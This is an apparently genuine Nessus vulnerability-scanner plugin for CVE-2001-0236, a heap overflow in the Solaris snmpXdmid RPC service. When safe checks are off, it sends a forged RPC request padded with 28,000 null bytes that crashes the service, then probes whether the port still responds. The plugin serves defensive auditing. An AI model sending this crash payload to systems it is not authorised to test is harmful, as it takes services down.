#
# This script is released under the GPL
#

if(description)
{
 script_id(10659);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-a-0003");
 script_bugtraq_id(2417);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2001-0236");
 
 name["english"] = "snmpXdmid overflow";
 name["francais"] = "snmpXdmid overflow";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote RPC service 100249 (snmpXdmid) is vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.

Solution : disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "heap overflow through snmpXdmid";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright(english:"This script is Copyright (C) 2001 Intranode");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 
 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");


port = get_rpc_port(program:100249, protocol:IPPROTO_TCP);
if(port)
{
  if(safe_checks())
  {
   if ( report_paranoia == 0 ) exit(0);
  data = " 
The remote RPC service 100249 (snmpXdmid) may be vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch
Risk factor : High";
  security_hole(port:port, data:data);
  exit(0);
  }
  
  
  if(get_port_state(port))
  {
   soc = open_sock_tcp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x00, 0x00, 0x0F, 0x9C, 0x22, 0x7D,
	  	  0x93, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x02, 0x00, 0x01, 0x87, 0x99, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x20, 0x3A, 0xF1, 
		  0x28, 0x90, 0x00, 0x00, 0x00, 0x09, 0x6C, 0x6F,
		  0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x06, 0x44, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00) +
		  crap(length:28000, data:raw_string(0x00));


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     sleep(1);
     soc2 = open_sock_tcp(port);
     if(!soc2)security_hole(port);
     else close(soc2);
   }
 }
}
